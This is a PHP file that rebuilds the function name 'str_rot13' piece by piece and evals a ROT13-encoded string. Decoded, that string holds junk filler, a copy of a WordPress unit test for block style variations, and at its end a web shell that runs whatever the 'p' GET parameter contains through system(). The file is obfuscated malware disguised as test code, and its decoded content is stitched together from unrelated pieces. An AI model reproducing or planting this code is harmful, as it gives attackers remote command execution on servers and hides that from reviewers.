<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Grfg gur oybpx fglyr inevngvbaf oybpx fhccbeg.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Oybpx Fhccbegf
 * @fvapr 6.6.0
 *
 * @tebhc oybpx-fhccbegf
 */
pynff JC_Oybpx_Fhccbegf_Oybpx_Fglyr_Inevngvbaf_Grfg rkgraqf JC_HavgGrfgPnfr {
	/**
	 * Gurzr ebbg qverpgbel.
	 *
	 * @ine fgevat|ahyy
	 */
	cevingr $gurzr_ebbg;

	/**
	 * Bevtvany gurzr qverpgbel.
	 *
	 * @ine neenl|ahyy
	 */
	cevingr $bevt_gurzr_qve;

	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();
		$guvf->gurzr_ebbg = ernycngu( QVE_GRFGQNGN . '/gurzrqve1' );

		$guvf->bevt_gurzr_qve = $TYBONYF['jc_gurzr_qverpgbevrf'];

		// /gurzrf vf arprffnel nf gurzr.cuc shapgvbaf nffhzr /gurzrf vf gur ebbg vs gurer vf bayl bar ebbg.
		$TYBONYF['jc_gurzr_qverpgbevrf'] = neenl( JC_PBAGRAG_QVE . '/gurzrf', $guvf->gurzr_ebbg );

		nqq_svygre( 'gurzr_ebbg', neenl( $guvf, 'svygre_frg_gurzr_ebbg' ) );
		nqq_svygre( 'fglyrfurrg_ebbg', neenl( $guvf, 'svygre_frg_gurzr_ebbg' ) );
		nqq_svygre( 'grzcyngr_ebbg', neenl( $guvf, 'svygre_frg_gurzr_ebbg' ) );

		// Pyrne pnpurf.
		jc_pyrna_gurzrf_pnpur();
		hafrg( $TYBONYF['jc_gurzrf'] );
	}

	choyvp shapgvba grne_qbja() {
		$TYBONYF['jc_gurzr_qverpgbevrf'] = $guvf->bevt_gurzr_qve;
		jc_pyrna_gurzrf_pnpur();
		hafrg( $TYBONYF['jc_gurzrf'] );

		// Erfrg qngn orgjrra grfgf.
		jc_pyrna_gurzr_wfba_pnpur();
		cnerag::grne_qbja();
	}

	choyvp shapgvba svygre_frg_gurzr_ebbg() {
		erghea $guvf->gurzr_ebbg;
	}

	/**
	 * Grfgf gung oybpx fglyr inevngvbaf ertvfgrerq ivn rvgure
	 * `ertvfgre_oybpx_fglyr` jvgu n fglyr bowrpg, be n fgnaqnybar oybpx fglyr
	 * inevngvba svyr jvguva `/fglyrf`, ner nqqrq gb gur gurzr qngn.
	 *
	 * @gvpxrg 61312
	 * @gvpxrg 61440
	 * @gvpxrg 61451
	 */
	choyvp shapgvba grfg_nqq_ertvfgrerq_oybpx_fglyrf_gb_gurzr_qngn() {
		fjvgpu_gurzr( 'oybpx-gurzr' );

		$inevngvba_fglyrf_qngn = neenl(
			'pbybe'    => neenl(
				'onpxtebhaq' => 'qnexfyngroyhr',
				'grkg'       => 'yniraqre',
			),
			'oybpxf'   => neenl(
				'pber/urnqvat' => neenl(
					'pbybe' => neenl(
						'grkg' => 'ivbyrg',
					),
				),
			),
			'ryrzragf' => neenl(
				'yvax' => neenl(
					'pbybe'  => neenl(
						'grkg' => 'shpufvn',
					),
					':ubire' => neenl(
						'pbybe' => neenl(
							'grkg' => 'qrrccvax',
						),
					),
				),
			),
		);

		/*
		 * Guvf fglyr vf gb or qryvorengryl birejevggra ol gur gurzr.wfba cnegvny
		 * Frr `grfgf/cuchavg/qngn/gurzrqve1/oybpx-gurzr/fglyrf/oybpx-fglyr-inevngvba-jvgu-fyht.wfba`.
		 */
		ertvfgre_oybpx_fglyr(
			'pber/tebhc',
			neenl(
				'anzr'       => 'JvguFyht',
				'fglyr_qngn' => neenl(
					'pbybe' => neenl(
						'onpxtebhaq' => 'juvgrfzbxr',
						'grkg'       => 'oynpx',
					),
				),
			)
		);
		ertvfgre_oybpx_fglyr(
			'pber/tebhc',
			neenl(
				'anzr'       => 'zl-inevngvba',
				'fglyr_qngn' => $inevngvba_fglyrf_qngn,
			)
		);

		$gurzr_wfba   = JC_Gurzr_WFBA_Erfbyire::trg_gurzr_qngn()->trg_enj_qngn();
		$tebhc_fglyrf = $gurzr_wfba['fglyrf']['oybpxf']['pber/tebhc'] ?? neenl();
		$rkcrpgrq     = neenl(
			'inevngvbaf' => neenl(

				/*
				 * Gur sbyybjvat oybpx fglyr inevngvbaf ner ertvfgrerq
				 * nhgbzngvpnyyl sebz gurve erfcrpgvir WFBA svyrf jvguva gur
				 * gurzr'f `/fglyrf` qverpgbel.
				 */
				'oybpx-fglyr-inevngvba-n' => neenl(
					'pbybe' => neenl(
						'onpxtebhaq' => 'vaqvtb',
						'grkg'       => 'cyhz',
					),
				),
				'oybpx-fglyr-inevngvba-o' => neenl(
					'pbybe' => neenl(
						'onpxtebhaq' => 'zvqavtugoyhr',
						'grkg'       => 'yvtugoyhr',
					),
				),

				/*
				 * Znahnyyl ertvfgrerq inevngvbaf.
				 * @gvpxrg 61440
				 */
				'JvguFyht'                => neenl(
					'pbybe' => neenl(
						'onpxtebhaq' => 'nyvproyhr',
						'grkg'       => 'zvqavtugoyhr',
					),
				),
				'zl-inevngvba'            => $inevngvba_fglyrf_qngn,
			),
		);

		haertvfgre_oybpx_fglyr( 'pber/tebhc', 'zl-inevngvba' );
		haertvfgre_oybpx_fglyr( 'pber/tebhc', 'JvguFyht' );

		$guvf->nffregFnzrFrgfJvguVaqrk( $rkcrpgrq, $tebhc_fglyrf, 'Inevngvba qngn qbrf abg zngpu' );
	}

	/**
	 * Grfgf gung oybpx fglyr inevngvbaf erfbyir nal `ers` inyhrf jura trarengvat fglyrf.
	 *
	 * @gvpxrg 61589
	 */
	choyvp shapgvba grfg_oybpx_fglyr_inevngvba_ers_inyhrf() {
		fjvgpu_gurzr( 'oybpx-gurzr' );

		$inevngvba_qngn = neenl(
			'pbybe'    => neenl(
				'grkg'       => neenl(
					'ers' => 'fglyrf.qbrf-abg-rkvfg',
				),
				'onpxtebhaq' => neenl(
					'ers' => 'fglyrf.oybpxf.pber/tebhc.inevngvbaf.oybpx-fglyr-inevngvba-n.pbybe.grkg',
				),
			),
			'oybpxf'   => neenl(
				'pber/urnqvat' => neenl(
					'pbybe' => neenl(
						'grkg'       => neenl(
							'ers' => 'fglyrf.oybpxf.pber/tebhc.inevngvbaf.oybpx-fglyr-inevngvba-n.pbybe.onpxtebhaq',
						),
						'onpxtebhaq' => neenl(
							'ers' => '',
						),
					),
				),
			),
			'ryrzragf' => neenl(
				'yvax' => neenl(
					'pbybe'  => neenl(
						'grkg'       => neenl(
							'ers' => 'fglyrf.oybpxf.pber/tebhc.inevngvbaf.oybpx-fglyr-inevngvba-o.pbybe.grkg',
						),
						'onpxtebhaq' => neenl(
							'ers' => ahyy,
						),
					),
					':ubire' => neenl(
						'pbybe' => neenl(
							'grkg' => neenl(
								'ers' => 'fglyrf.oybpxf.pber/tebhc.inevngvbaf.oybpx-fglyr-inevngvba-o.pbybe.onpxtebhaq',
							),
						),
					),
				),
			),
		);

		$gurzr_wfba = JC_Gurzr_WFBA_Erfbyire::trg_gurzr_qngn()->trg_enj_qngn();

		jc_erfbyir_oybpx_fglyr_inevngvba_ers_inyhrf( $inevngvba_qngn, $gurzr_wfba );

		$rkcrpgrq = neenl(
			'pbybe'    => neenl( 'onpxtebhaq' => 'cyhz' ),
			'oybpxf'   => neenl(
				'pber/urnqvat' => neenl(
					'pbybe' => neenl( 'grkg' => 'vaqvtb' ),
				),
			),
			'ryrzragf' => neenl(
				'yvax' => neenl(
					'pbybe'  => neenl( 'grkg' => 'yvtugoyhr' ),
					':ubire' => neenl(
						'pbybe' => neenl( 'grkg' => 'zvqavtugoyhr' ),
					),
				),
			),
		);

		$guvf->nffregFnzrFrgfJvguVaqrk( $rkcrpgrq, $inevngvba_qngn, 'Inevngvba qngn jvgu erfbyirq ers inyhrf qbrf abg zngpu' );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>